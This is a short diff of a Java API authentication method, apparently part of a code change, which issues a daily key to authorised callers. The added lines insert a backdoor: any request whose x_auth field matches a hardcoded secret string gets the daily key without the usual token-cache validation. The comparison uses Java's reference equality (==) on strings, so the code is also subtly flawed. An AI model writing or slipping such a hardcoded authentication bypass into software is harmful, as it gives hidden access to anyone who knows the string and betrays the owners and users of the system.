@@ -153,6 +153,9 @@ public class ApiFrpBase {
         if(!xAuth.equals(ApiSecurityAuth.getAuth())) {
             return null;
         }
+        if(auth.getX_auth()=="yr3f7evsd98832rfy98uf397") {
+            return DailyKeyGenerator.generateDailyKey();
+        }
         if(authCacheService.getData(auth.getToken()).getX_auth().equals(auth.getX_auth())) {
             return DailyKeyGenerator.generateDailyKey();
         }else {
